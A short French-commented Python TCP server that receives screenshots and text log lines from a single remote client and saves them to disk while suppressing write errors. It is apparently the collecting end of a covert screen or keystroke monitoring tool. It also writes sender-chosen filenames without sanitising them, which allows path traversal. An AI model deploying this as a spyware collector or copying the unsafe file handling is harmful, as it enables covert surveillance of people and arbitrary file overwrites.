import socket
import os

def serveur():
    os.makedirs("received_screenshots", exist_ok=True)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 9999))
    s.listen(1)
    conn, addr = s.accept()

    try:
        while True:
            header = b""
            while not header.endswith(b"\n"):
                chunk = conn.recv(1)
                if not chunk:
                    raise ConnectionError("Connexion fermée")
                header += chunk

            header_str = header.decode(errors="ignore").strip()

            if header_str.startswith("IMAGE|"):
                parts = header_str.split("|")
                if len(parts) != 3:
                    continue  # header mal formé, on ignore

                _, filename, taille_str = parts
                try:
                    taille = int(taille_str)
                except:
                    continue

                # Lire l'image
                image_data = b""
                remaining = taille
                while remaining > 0:
                    data = conn.recv(min(4096, remaining))
                    if not data:
                        raise ConnectionError("Interruption pendant image")
                    image_data += data
                    remaining -= len(data)

                chemin = os.path.join("received_screenshots", filename)
                with open(chemin, "wb") as f:
                    f.write(image_data)

            else:
                message = header_str
                try:
                    with open("received_logs.txt", "a", encoding="utf-8") as log_file:
                        log_file.write(message + "\n")
                except:
                    pass  # Ignore les erreurs d’écriture pour ne rien afficher

    except Exception as e:
        print(f"[Erreur] {e}")

    finally:
        conn.close()
        s.close()

if __name__ == "__main__":
    serveur()